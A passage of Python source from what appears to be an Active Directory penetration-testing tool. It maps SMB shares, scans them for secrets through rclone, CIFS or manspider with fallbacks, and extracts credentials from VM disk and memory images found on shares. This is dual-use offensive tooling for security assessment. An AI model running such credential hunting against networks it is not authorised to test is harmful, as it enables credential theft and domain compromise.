    run_post_mapping_workflow: bool = True,
) -> bool:
    """Walk hosts' readable shares natively and consolidate into one map JSON.

    The engine is a native aiosmb recursive walk (the retired NetExec
    ``spider_plus`` subprocess). ``spider_plus`` remains only as the on-disk
    storage-bucket / JSON-schema identifier for backward compatibility.
    """
    import asyncio

    from adscan_internal.services.share_mapping_service import ShareMappingService

    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)

    if not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"No SMB hosts available for share-tree mapping in domain {marked_domain}."
        )
        return False
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No SMB shares eligible for share-tree mapping after applying global "
            f"exclusions in {marked_domain}."
        )
        return False

    workspace_cwd = shell._get_workspace_cwd()
    spider_plus_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
    )
    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_folder = f"{run_id}_{_slugify_token(username)}"
    run_output_abs = os.path.join(spider_plus_root_abs, "runs", run_folder)
    os.makedirs(run_output_abs, exist_ok=True)
    run_output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
        "runs",
        run_folder,
    )
    aggregate_map_abs = os.path.join(spider_plus_root_abs, "share_tree_map.json")
    aggregate_map_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
        "share_tree_map.json",
    )

    marked_domain = mark_sensitive(domain, "domain")
    marked_username = mark_sensitive(username, "user")
    marked_output_rel = mark_sensitive(run_output_rel, "path")
    marked_aggregate_rel = mark_sensitive(aggregate_map_rel, "path")

    print_operation_header(
        "SMB Share Tree Mapping (native walk)",
        details={
            "Domain": marked_domain,
            "Principal": marked_username,
            "Hosts": str(len(hosts)),
            "Readable Shares": str(len(shares)),
            "Engine": "Native aiosmb recursive walk",
            "Download Mode": "Metadata only",
            "Run Output": marked_output_rel,
            "Aggregate JSON": marked_aggregate_rel,
        },
        icon="🕸️",
    )

    try:
        walk_summary = asyncio.run(
            _native_build_share_tree_host_json(
                shell,
                domain=domain,
                hosts=hosts,
                shares=shares,
                username=username,
                password=password,
                share_map=share_map,
                run_output_dir=run_output_abs,
            )
        )
        if walk_summary.get("aborted"):
            print_error(
                "Native SMB share-tree walk aborted before authenticating: "
                f"{walk_summary.get('abort_reason', 'credential pre-mint failed')}."
            )
            return False

        service = ShareMappingService()
        principal_label = f"{domain}\\{username}"
        summary = service.merge_spider_plus_run(
            domain=domain,
            principal=principal_label,
            run_id=run_id,
            run_output_dir=run_output_abs,
            aggregate_map_path=aggregate_map_abs,
            requested_hosts=hosts,
            requested_shares=shares,
            host_share_permissions=share_map,
        )
        host_json_count = int(summary.get("host_json_files", 0))
        merged_files = int(summary.get("merged_file_entries", 0))

        if host_json_count == 0:
            print_warning(
                "No share-tree host metadata files were generated. "
                "The consolidated mapping file was still updated."
            )
        else:
            print_success(
                f"SMB share mapping updated with {host_json_count} host file(s) and "
                f"{merged_files} file metadata entries."
            )
        print_info(f"Consolidated SMB share tree map saved to {marked_aggregate_rel}.")
        if run_post_mapping_workflow:
            try:
                _run_post_mapping_sensitive_data_workflow(
                    shell,
                    domain=domain,
                    aggregate_map_abs=aggregate_map_abs,
                    aggregate_map_rel=aggregate_map_rel,
                    shares=shares,
                    hosts=hosts,
                    share_map=share_map,
                    triage_username=username,
                    triage_password=password,
                    selected_method=selected_method,
                )
            except Exception as triage_exc:  # noqa: BLE001
                telemetry.capture_exception(triage_exc)
                print_warning(
                    "SMB share mapping completed, but post-mapping sensitive-data analysis "
                    "failed and was skipped."
                )
                print_warning_debug(
                    "Post-mapping sensitive-data analysis failure: "
                    f"{type(triage_exc).__name__}: {triage_exc}"
                )
                print_warning_debug(traceback.format_exc())
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error while executing native SMB share-tree mapping.")
        print_exception(show_locals=False, exception=exc)
        print_error_debug(traceback.format_exc())
        return False


def _resolve_rclone_path(shell: Any) -> str:
    """Resolve rclone executable path from shell attributes or PATH fallback."""
    configured_path = str(getattr(shell, "rclone_path", "") or "").strip()
    return configured_path or "rclone"


def run_smb_share_tree_mapping_with_rclone(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    selected_method: str | None = None,
    run_post_mapping_workflow: bool = True,
) -> bool:
    """Run rclone SMB metadata mapping and consolidate into one domain map JSON."""
    from adscan_internal.services.rclone_share_mapping_service import (
        RcloneShareMappingService,
    )
    from adscan_internal.services.share_mapping_service import ShareMappingService
    from adscan_internal.workspaces import read_json_file

    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)

    if not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"No SMB hosts available for rclone mapping in domain {marked_domain}."
        )
        return False
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No SMB shares eligible for rclone mapping after applying global "
            f"exclusions in {marked_domain}."
        )
        return False

    rclone_path = _resolve_rclone_path(shell)
    rclone_version_cmd = f"{shlex.quote(rclone_path)} version"
    version_result = shell.run_command(
        rclone_version_cmd,
        timeout=30,
        ignore_errors=True,
    )
    if version_result is None or int(getattr(version_result, "returncode", 1)) != 0:
        print_error(
            "rclone is not available. Install it and ensure it is in PATH "
            "to use rclone SMB mapping."
        )
        return False
    if not _is_rclone_supported_for_smb_auth(
        shell,
        domain=domain,
        username=username,
    ):
        print_warning(
            "rclone SMB mapping does not support null-session authentication. "
            "Use spider_plus for AI/null-session mapping instead."
        )
        return False

    workspace_cwd = shell._get_workspace_cwd()
    rclone_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
    )
    aggregate_map_abs = os.path.join(rclone_root_abs, "share_tree_map.json")
    aggregate_map_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "share_tree_map.json",
    )

    target_pairs = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or "audit"
    mapping_mode = _resolve_smb_mapping_mode(shell)
    expected_cache_metadata = _build_smb_rclone_mapping_cache_metadata(
        domain=domain,
        username=username,
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    marked_domain = mark_sensitive(domain, "domain")
    marked_username = mark_sensitive(username, "user")
    marked_aggregate_rel = mark_sensitive(aggregate_map_rel, "path")
    marked_rclone = mark_sensitive(rclone_path, "path")

    if mapping_mode in {_SMB_MAPPING_MODE_REUSE, _SMB_MAPPING_MODE_AUTO} and os.path.exists(aggregate_map_abs):
        from adscan_internal.services.windows_loot_cache_service import try_use_mapping_cache

        def _smb_loader() -> "tuple[int, dict] | None":
            data = read_json_file(aggregate_map_abs)
            ok, reason, _ = _is_smb_rclone_mapping_cache_compatible(
                cache_payload=data, expected_metadata=expected_cache_metadata,
            )
            if not ok:
                print_info_debug(
                    f"Cached SMB rclone mapping not compatible: reason={reason} "
                    f"path={marked_aggregate_rel} "
                    f"mapping_mode={mark_sensitive(mapping_mode, 'text')}"
                )
                return None
            entry_count = _count_smb_mapping_file_entries(
                cache_payload=data, hosts=hosts, shares=shares, share_map=share_map,
            )
            return entry_count, data

        force_reuse = mapping_mode == _SMB_MAPPING_MODE_REUSE
        if force_reuse:
            # Forced reuse: bypass prompt, just load if compatible.
            import contextlib
            _smb_data: dict | None = None
            with contextlib.suppress(Exception):
                _r = _smb_loader()
                if _r:
                    _smb_data = _r[1]
            if _smb_data is not None:
                print_info(
                    "Using cached SMB rclone mapping from "
                    f"{marked_aggregate_rel} because reuse was forced."
                )
                if run_post_mapping_workflow:
                    _run_post_mapping_sensitive_data_workflow(
                        shell,
                        domain=domain,
                        aggregate_map_abs=aggregate_map_abs,
                        aggregate_map_rel=aggregate_map_rel,
                        shares=shares,
                        hosts=hosts,
                        share_map=share_map,
                        triage_username=username,
                        triage_password=password,
                        selected_method=selected_method,
                    )
                return True
        else:
            cached = try_use_mapping_cache(
                shell,
                manifest_path=aggregate_map_abs,
                workspace_type=workspace_type,
                transport_label="SMB",
                loader=_smb_loader,
            )
            if cached is not None:
                print_info(
                    "Using cached SMB rclone mapping from "
                    f"{marked_aggregate_rel}."
                )
                if run_post_mapping_workflow:
                    _run_post_mapping_sensitive_data_workflow(
                        shell,
                        domain=domain,
                        aggregate_map_abs=aggregate_map_abs,
                        aggregate_map_rel=aggregate_map_rel,
                        shares=shares,
                        hosts=hosts,
                        share_map=share_map,
                        triage_username=username,
                        triage_password=password,
                        selected_method=selected_method,
                    )
                return True
    elif mapping_mode == _SMB_MAPPING_MODE_REFRESH and os.path.exists(
        aggregate_map_abs
    ):
        print_info(
            "Cached SMB rclone mapping exists at "
            f"{marked_aggregate_rel}, but refresh mode forces a new mapping."
        )

    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_folder = f"{run_id}_{_slugify_token(username)}"
    run_output_abs = os.path.join(rclone_root_abs, "runs", run_folder)
    os.makedirs(run_output_abs, exist_ok=True)
    run_output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "runs",
        run_folder,
    )
    marked_output_rel = mark_sensitive(run_output_rel, "path")

    print_operation_header(
        "SMB Share Tree Mapping (rclone)",
        details={
            "Domain": marked_domain,
            "Principal": marked_username,
            "Hosts": str(len(hosts)),
            "Readable Shares": str(len(shares)),
            "Targets": str(len(target_pairs)),
            "Run Output": marked_output_rel,
            "Aggregate JSON": marked_aggregate_rel,
            "rclone": marked_rclone,
            "Cache Policy": mark_sensitive(mapping_mode, "text"),
        },
        icon="🧭",
    )

    try:
        rclone_service = RcloneShareMappingService()
        transport_username, transport_password, transport_domain = (
            _resolve_rclone_transport_auth(
                shell,
                domain=domain,
                username=username,
                password=password,
            )
        )
        mapping_result = rclone_service.generate_host_metadata_json(
            run_output_dir=run_output_abs,
            host_share_targets=target_pairs,
            username=transport_username,
            password=transport_password,
            domain=transport_domain,
            command_executor=shell.run_command,
            rclone_path=rclone_path,
            timeout_seconds=1200,
        )

        service = ShareMappingService()
        principal_label = f"{domain}\\{username}"
        summary = service.merge_spider_plus_run(
            domain=domain,
            principal=principal_label,
            run_id=run_id,
            run_output_dir=run_output_abs,
            aggregate_map_path=aggregate_map_abs,
            requested_hosts=hosts,
            requested_shares=shares,
            host_share_permissions=share_map,
        )
        host_json_count = int(summary.get("host_json_files", 0))
        merged_files = int(summary.get("merged_file_entries", 0))
        mapped_shares = int(mapping_result.get("mapped_shares", 0))
        partial_targets = int(mapping_result.get("partial_targets", 0))
        failed_targets = int(mapping_result.get("failed_targets", 0))

        if host_json_count == 0:
            print_warning(
                "rclone mapping found no host metadata files to consolidate. "
                "Verify SMB permissions and target paths."
            )
        else:
            print_success(
                f"rclone share mapping updated with {host_json_count} host file(s), "
                f"{mapped_shares} mapped share(s), and {merged_files} file metadata entries."
            )
        if partial_targets > 0:
            print_warning_debug(
                "rclone mapping accepted partial targets with non-zero exit code: "
                f"partial_targets={partial_targets} total_targets={len(target_pairs)}"
            )
        if failed_targets > 0:
            print_warning_debug(
                "rclone mapping targets failed: "
                f"failed_targets={failed_targets} total_targets={len(target_pairs)}"
            )
        print_info(f"Consolidated SMB share tree map saved to {marked_aggregate_rel}.")
        if run_post_mapping_workflow:
            _run_post_mapping_sensitive_data_workflow(
                shell,
                domain=domain,
                aggregate_map_abs=aggregate_map_abs,
                aggregate_map_rel=aggregate_map_rel,
                shares=shares,
                hosts=hosts,
                share_map=share_map,
                triage_username=username,
                triage_password=password,
                selected_method=selected_method,
            )
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error while executing rclone SMB share mapping.")
        print_exception(show_locals=False, exception=exc)
        print_error_debug(traceback.format_exc())
        return False


def _run_post_mapping_sensitive_data_workflow(
    shell: Any,
    *,
    domain: str,
    aggregate_map_abs: str,
    aggregate_map_rel: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    triage_username: str | None = None,
    triage_password: str | None = None,
    selected_method: str | None = None,
    cifs_mount_root: str | None = None,
) -> None:
    """Run post-mapping sensitive-data search using deterministic and/or AI flow."""
    from adscan_internal.services.ai_backend_availability_service import (
        AIBackendAvailabilityService,
    )

    availability = AIBackendAvailabilityService().get_availability()
    hosts_count = len(hosts)
    shares_count = len(shares)
    print_info_debug(
        "Post-mapping AI availability: "
        f"configured={availability.configured} enabled={availability.enabled} "
        f"provider={availability.provider} reason={availability.reason}"
    )

    if selected_method is None:
        selected_method = _select_post_mapping_sensitive_data_method(
            shell=shell,
            ai_configured=availability.configured,
            domain=domain,
            username=triage_username,
            password=triage_password,
        )
    selected_method = _normalize_sensitive_data_method_for_smb_auth(
        shell,
        domain=domain,
        username=triage_username,
        password=triage_password,
        selected_method=selected_method,
    )
    _capture_post_mapping_sensitive_data_telemetry(
        shell=shell,
        stage="selected",
        method=(selected_method or "skip"),
        outcome="method_selected" if selected_method else "skipped_by_user",
        ai_configured=availability.configured,
        ai_provider=availability.provider,
        ai_reason=availability.reason,
        hosts_count=hosts_count,
        shares_count=shares_count,
    )
    if selected_method is None:
        print_info("Post-mapping sensitive-data analysis skipped by user.")
        return

    if selected_method not in {
        "deterministic_rclone_direct",
        "deterministic_rclone_mapped",
        "deterministic_cifs",
        "deterministic_manspider",
    }:
        marked_method = mark_sensitive(selected_method, "text")
        print_warning(
            f"Unsupported sensitive-data analysis method selected: {marked_method}."
        )
        return

    marked_method = mark_sensitive(selected_method, "text")
    print_info_debug(f"Post-mapping sensitive-data method selected: {marked_method}")
    deterministic_executed = False
    ai_attempted = False
    ai_success: bool | None = None
    fallback_used = False

    deterministic_executed = True
    deterministic_result = _run_selected_deterministic_share_scan(
        shell=shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=share_map,
        username=triage_username or "",
        password=triage_password or "",
        selected_method=selected_method,
        cifs_mount_root=cifs_mount_root,
        ai_configured=availability.configured,
    )
    fallback_used = bool(deterministic_result.get("fallback_used"))
    ai_attempted = bool(deterministic_result.get("ai_attempted"))
    ai_success = deterministic_result.get("ai_success")

    if selected_method == "deterministic_rclone_direct":
        outcome = (
            "deterministic_rclone_direct_completed"
            if not fallback_used
            else "deterministic_rclone_direct_failed_fallback_attempted"
        )
    elif selected_method == "deterministic_rclone_mapped":
        outcome = (
            "deterministic_rclone_mapped_completed"
            if not fallback_used
            else "deterministic_rclone_mapped_failed_fallback_attempted"
        )
    elif selected_method == "deterministic_cifs":
        outcome = (
            "deterministic_cifs_completed"
            if not fallback_used
            else "deterministic_cifs_failed_fallback_manspider_attempted"
        )
    elif selected_method == "deterministic_manspider":
        outcome = "deterministic_manspider_completed"
    else:
        outcome = "unknown"

    _capture_post_mapping_sensitive_data_telemetry(
        shell=shell,
        stage="completed",
        method=selected_method,
        outcome=outcome,
        ai_configured=availability.configured,
        ai_provider=availability.provider,
        ai_reason=availability.reason,
        hosts_count=hosts_count,
        shares_count=shares_count,
        deterministic_executed=deterministic_executed,
        ai_attempted=ai_attempted,
        ai_success=ai_success,
        fallback_used=fallback_used,
    )


def _resolve_default_deterministic_share_analysis_method(
    shell: Any,
    *,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
) -> str:
    """Resolve the production deterministic SMB backend from workspace type."""
    del password
    if _is_null_session_smb_auth(shell, domain=domain, username=username):
        return "deterministic_manspider"
    workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
    if workspace_type == "audit":
        return "deterministic_rclone_mapped"
    return "deterministic_rclone_direct"


def _resolve_deterministic_backend_from_method(selected_method: str) -> str:
    """Map one user-visible deterministic method to an internal backend id."""
    mapping = {
        "deterministic_rclone_direct": "rclone_direct",
        "deterministic_rclone_mapped": "rclone_mapped",
        "deterministic_cifs": "cifs",
        "deterministic_manspider": "manspider",
    }
    return mapping.get(str(selected_method or "").strip(), "manspider")


def _run_selected_deterministic_share_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    selected_method: str,
    cifs_mount_root: str | None = None,
    ai_configured: bool = False,
) -> dict[str, Any]:
    """Run deterministic scan with the configured fallback chain."""
    requested_method = str(selected_method or "").strip()
    selected_method = _normalize_sensitive_data_method_for_smb_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
        selected_method=selected_method,
    )
    primary_backend = _resolve_deterministic_backend_from_method(selected_method)
    executed_backends: list[str] = []

    if (
        requested_method == "deterministic_rclone_mapped"
        and selected_method == "deterministic_manspider"
    ):
        print_info_debug(
            "Preparing spider_plus share-tree mapping before manspider fallback "
            "because the requested deterministic rclone mapped workflow cannot use "
            "the current SMB authentication material."
        )
        mapping_success = run_smb_share_tree_mapping_with_spider_plus(
            shell,
            domain=domain,
            shares=shares,
            username=username,
            password=password,
            hosts=hosts,
            share_map=share_map,
            selected_method="deterministic_manspider",
            run_post_mapping_workflow=False,
        )
        if not mapping_success:
            print_warning(
                "spider_plus mapping did not complete successfully before the "
                "manspider fallback. Continuing with manspider download analysis."
            )

    def _run_backend(backend: str) -> dict[str, Any]:
        executed_backends.append(backend)
        result = _run_post_mapping_deterministic_share_scan_with_backend(
            shell=shell,
            domain=domain,
            shares=shares,
            hosts=hosts,
            share_map=share_map,
            username=username,
            password=password,
            backend=backend,
            cifs_mount_root=cifs_mount_root,
            ai_configured=ai_configured,
        )
        if isinstance(result, dict):
            return result
        return {
            "completed": bool(result),
            "ai_attempted": False,
            "ai_success": None,
        }

    primary_result = _run_backend(primary_backend)
    completed = bool(primary_result.get("completed"))
    fallback_used = False
    if completed:
        return {
            "completed": True,
            "fallback_used": False,
            "executed_backends": executed_backends,
            "ai_attempted": bool(primary_result.get("ai_attempted")),
            "ai_success": primary_result.get("ai_success"),
        }

    if primary_backend.startswith("rclone"):
        fallback_used = True
        print_warning(
            "rclone deterministic analysis did not complete successfully. "
            "Falling back to legacy manspider analysis."
        )
        fallback_result = _run_backend("manspider")
        completed = bool(fallback_result.get("completed"))
        if completed:
            return {
                "completed": True,
                "fallback_used": True,
                "executed_backends": executed_backends,
                "ai_attempted": bool(fallback_result.get("ai_attempted")),
                "ai_success": fallback_result.get("ai_success"),
            }
        print_warning(
            "Legacy manspider fallback did not complete successfully. "
            "Falling back to CIFS deterministic analysis."
        )
        fallback_result = _run_backend("cifs")
        completed = bool(fallback_result.get("completed"))
    elif primary_backend == "cifs":
        fallback_used = True
        print_warning(
            "CIFS deterministic analysis did not complete successfully. "
            "Falling back to legacy manspider analysis."
        )
        fallback_result = _run_backend("manspider")
        completed = bool(fallback_result.get("completed"))
    else:
        fallback_result = primary_result

    return {
        "completed": bool(completed),
        "fallback_used": fallback_used,
        "executed_backends": executed_backends,
        "ai_attempted": bool(fallback_result.get("ai_attempted")),
        "ai_success": fallback_result.get("ai_success"),
    }


def _capture_post_mapping_sensitive_data_telemetry(
    *,
    shell: Any,
    stage: str,
    method: str,
    outcome: str,
    ai_configured: bool,
    ai_provider: str,
    ai_reason: str,
    hosts_count: int,
    shares_count: int,
    deterministic_executed: bool = False,
    ai_attempted: bool = False,
    ai_success: bool | None = None,
    fallback_used: bool = False,
) -> None:
    """Capture telemetry event for post-mapping sensitive-data workflow."""
    properties: dict[str, Any] = {
        "stage": stage,
        "method": method,
        "outcome": outcome,
        "ai_configured": ai_configured,
        "ai_provider": ai_provider,
        "ai_reason": ai_reason,
        "hosts_count": hosts_count,
        "shares_count": shares_count,
        "deterministic_executed": deterministic_executed,
        "ai_attempted": ai_attempted,
        "fallback_used": fallback_used,
        "auto_mode": bool(getattr(shell, "auto", False)),
        "workspace_type": str(getattr(shell, "type", "") or "").strip().lower()
        or "unknown",
    }
    if ai_success is not None:
        properties["ai_success"] = ai_success
    telemetry.capture("smb_sensitive_data_analysis", properties)


def _run_post_mapping_deterministic_share_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
) -> dict[str, Any]:
    """Run deterministic share secret search via selected backend."""
    return _run_post_mapping_deterministic_share_scan_with_backend(
        shell=shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=share_map,
        username=username,
        password=password,
        backend=_resolve_deterministic_backend_from_method(
            _resolve_default_deterministic_share_analysis_method(
                shell,
                domain=domain,
                username=username,
                password=password,
            )
        ),
    )


def _run_post_mapping_deterministic_share_scan_with_backend(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    backend: str,
    cifs_mount_root: str | None = None,
    ai_configured: bool = False,
) -> dict[str, Any]:
    """Run deterministic share secret search via chosen backend."""
    return _run_post_mapping_deterministic_share_scan_sequence(
        shell=shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=share_map,
        username=username,
        password=password,
        backend=backend,
        cifs_mount_root=cifs_mount_root,
        ai_configured=ai_configured,
    )


def _vm_disks_from_share_tree_map(
    map_data: dict[str, Any],
) -> list[tuple[str, str, str]]:
    """Enumerate VM disk artifacts from a consolidated share-tree map.

    Walks ``map_data["hosts"][host]["shares"][share]["files"][path]`` and returns
    ``(host, share, relative_path)`` for every file whose extension is a VM disk
    image (``classify_vm_artifact == "disk"``). Pure logic over an already-built
    map — no enumeration, so it scales: the lsjson walk was paid once for the whole
    scan (and is cache-reused across re-enumerations of the same share).
    """
    from adscan_internal.services.vm_artifact_service import classify_vm_artifact

    results: list[tuple[str, str, str]] = []
    hosts = map_data.get("hosts") if isinstance(map_data, dict) else None
    if not isinstance(hosts, dict):
        return results
    for host, host_payload in hosts.items():
        shares = host_payload.get("shares") if isinstance(host_payload, dict) else None
        if not isinstance(shares, dict):
            continue
        for share, share_payload in shares.items():
            files = share_payload.get("files") if isinstance(share_payload, dict) else None
            if not isinstance(files, dict):
                continue
            for rel_path in files:
                if classify_vm_artifact(str(rel_path)) == "disk":
                    results.append((str(host), str(share), str(rel_path)))
    return results


def _vm_artifacts_from_share_tree_map(
    map_data: dict[str, Any],
) -> list[tuple[str, str, str, str]]:
    """Enumerate disk AND memory VM artifacts: ``(host, share, relpath, kind)``.

    ``kind`` is ``disk`` (cracked open with dissect, sparse/chain) or ``memory``
    (raw RAM image carved with Volatility 3). Pure logic over the already-built map.
    """
    from adscan_internal.services.vm_artifact_service import classify_vm_artifact

    results: list[tuple[str, str, str, str]] = []
    hosts = map_data.get("hosts") if isinstance(map_data, dict) else None
    if not isinstance(hosts, dict):
        return results
    for host, host_payload in hosts.items():
        shares = host_payload.get("shares") if isinstance(host_payload, dict) else None
        if not isinstance(shares, dict):
            continue
        for share, share_payload in shares.items():
            files = share_payload.get("files") if isinstance(share_payload, dict) else None
            if not isinstance(files, dict):
                continue
            for rel_path in files:
                kind = classify_vm_artifact(str(rel_path))
                if kind in ("disk", "memory"):
                    results.append((str(host), str(share), str(rel_path), kind))
    return results


def _run_deterministic_vm_disk_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None,
    username: str,
    password: str,
) -> int:
    """Discover + extract credentials from VM disk artifacts on the shares.

    Unified across CTF and audit: ensures the consolidated ``share_tree_map.json``
    exists (reusing the SMB-mapping cache, building it once if absent — cheap and
    cached), reads it to find VM disk images WITHOUT re-enumerating, and for each
    reads it SPARSELY over native aiosmb (never downloading the multi-GB image),
    then persists credentials DCSync-style (DC snapshot) / Backup-Operators-style
    (member-server snapshot). Best-effort: never aborts the surrounding scan.
    """
    try:
        from adscan_internal.cli.vm_artifact_credentials import (
            persist_vm_disk_credentials,
        )
        from adscan_internal.services.vm_artifact_service import VMArtifactService
        from adscan_internal.workspaces import read_json_file

        map_abs = domain_path(
            shell._get_workspace_cwd(),
            shell.domains_dir,
            domain,
            shell.smb_dir,
            "rclone",
            "share_tree_map.json",
        )
        if not os.path.isfile(map_abs):
            # CTF (rclone_direct) skips mapping; build the map once (cache-aware).
            run_smb_share_tree_mapping_with_rclone(
                shell,
                domain=domain,
                shares=shares,
                username=username,
                password=password,
                hosts=hosts,
                share_map=share_map,
                run_post_mapping_workflow=False,
            )
        if not os.path.isfile(map_abs):
            print_info_debug(
                "VM disk scan: no share-tree map available; skipping VM disk artifacts."
            )
            return 0

        map_data = read_json_file(map_abs) or {}
        artifacts = _vm_artifacts_from_share_tree_map(map_data)
        if not artifacts:
            print_info_debug(
                "VM artifact scan: no VM disk/memory artifacts found on mapped shares."
            )
            return 0

        service = VMArtifactService()
        stored_total = 0
        for host, share, rel_path, kind in artifacts:
            host_fqdn = _normalize_smb_host_for_resolution(host, domain) or host
            if kind == "memory":
                extraction = service.extract_from_smb_memory(
                    shell=shell,
                    domain=domain,
                    host=host_fqdn,
                    share=share,
                    source_path=rel_path,
                    auth_username=username,
                    auth_password=password,
                )
            else:
                extraction = service.extract_from_smb_disk(
                    shell=shell,
                    domain=domain,
                    host=host_fqdn,
                    share=share,
                    source_path=rel_path,
                    size=None,  # resolved via native aiosmb stat (map size is human-formatted)
                    auth_username=username,
                    auth_password=password,
                )
            persist_result = persist_vm_disk_credentials(
                shell,
                domain=domain,
                host=host_fqdn,
                source_label=f"\\\\{host}\\{share}\\{rel_path}",
                extraction=extraction,
            )
            stored_total += int(getattr(persist_result, "stored", 0) or 0)
        return stored_total
    except Exception as exc:  # noqa: BLE001 - VM disk scan must never abort the share scan
        telemetry.capture_exception(exc)
        print_warning_debug(f"VM disk artifact scan failed (non-fatal): {exc}")
        return 0


def _run_post_mapping_deterministic_share_scan_sequence(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    backend: str,
    cifs_mount_root: str | None = None,
    ai_configured: bool = False,
) -> dict[str, Any]:
    """Run staged deterministic SMB analysis using a backend-specific runner."""
    phase_sequence = get_production_sensitive_scan_phase_sequence()
    if not phase_sequence:
        return {"completed": False, "credential_findings": 0, "phases_run": []}
    staged_result = _run_staged_smb_sensitive_scan(
        shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=share_map,
        username=username,
        password=password,
        backend=backend,
        cifs_mount_root=cifs_mount_root,
        ai_configured=ai_configured,
        prepare_backend_context=_prepare_post_mapping_deterministic_rclone_context,
        run_phase=_run_sensitive_scan_phase_with_backend,
        print_completion_summary=_print_deterministic_rclone_completion_summary,
        should_run_phase=_should_run_credential_phase,
        should_run_heavy_phase=_should_continue_with_heavy_artifact_analysis,
    )

    # VM disk artifacts (.vhd/.vmdk/.vhdx/.vdi/.avhdx): discovered from the same
    # consolidated share-tree map (built once, cache-reused — unified for CTF and
    # audit), read sparsely over native aiosmb, and persisted DCSync-style. Runs
    # after the byte-based phases; never aborts the surrounding scan.
    vm_disk_stored = _run_deterministic_vm_disk_scan(
        shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=share_map,
        username=username,
        password=password,
    )
    if vm_disk_stored and isinstance(staged_result, dict):
        staged_result["vm_disk_credentials"] = vm_disk_stored
        staged_result["credential_findings"] = (
            int(staged_result.get("credential_findings", 0) or 0) + vm_disk_stored
        )
    return staged_result


def _normalize_smb_host_for_resolution(host: str, domain: str) -> str:
    """Convert an attack-graph node id into a DNS-resolvable SMB host.

    Attack-graph nodes use AD identity format (``SRV-AIS$@AIS.LOCAL``) where:
      - the ``$`` suffix is the sAMAccountName convention for computer accounts
        and is **not** part of the DNS name;
      - the ``@AIS.LOCAL`` suffix is the realm and never a DNS suffix here.

    Returns an FQDN when the short hostname is not already qualified.
    """
    candidate = host.split("@", 1)[0].strip()
    if candidate.endswith("$"):
        candidate = candidate[:-1]
    if not candidate:
        return ""
    if "." in candidate:
        return candidate
    domain_clean = domain.strip().rstrip(".")
    return f"{candidate}.{domain_clean}" if domain_clean else candidate


def run_smb_share_credential_hunt(
    shell: Any,
    *,
    domain: str,
    targets: list[dict[str, str]],
    username: str | None = None,
    credential: str | None = None,
) -> dict[str, Any]:
    """Scan selected SMB shares for credentials from the attack paths context.

    Args:
        shell: ADscan shell context.
        domain: Target domain name.
        targets: List of {"host": "<host[@domain]>", "share": "<share>"} dicts.
        username: Principal to loot AS — MUST be the one whose effective READ
            access selected these shares (the assessed user), not the domain's
            active credential. Falls back to ``domain_data`` only when absent
            (the all-users Phase 7 path). Looting as a principal that lacks read
            access yields permission-denied and silently misses embedded creds.
        credential: That principal's secret (password). Falls back with username.

    Returns:
        Result dict with at least "completed" and "credential_findings" keys.
    """
    from adscan_internal.services.ai_backend_availability_service import (
        AIBackendAvailabilityService,
    )

    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    username = str(username or domain_data.get("username") or "").strip()
    password = str(credential or domain_data.get("password") or "").strip()
    if not username or not password:
        print_warning("No domain credentials available — cannot scan shares for credentials.")
        return {"completed": False, "credential_findings": 0, "phases_run": []}

    hosts = sorted({
        normalized
        for t in targets
        if (normalized := _normalize_smb_host_for_resolution(t.get("host", ""), domain))
    })
    shares = sorted({t["share"] for t in targets if t.get("share")})
    if not hosts or not shares:
        return {"completed": False, "credential_findings": 0, "phases_run": []}

    availability = AIBackendAvailabilityService().get_availability()
    return _run_post_mapping_deterministic_share_scan_sequence(
        shell,
        domain=domain,
        shares=shares,
        hosts=hosts,
        share_map=None,
        username=username,
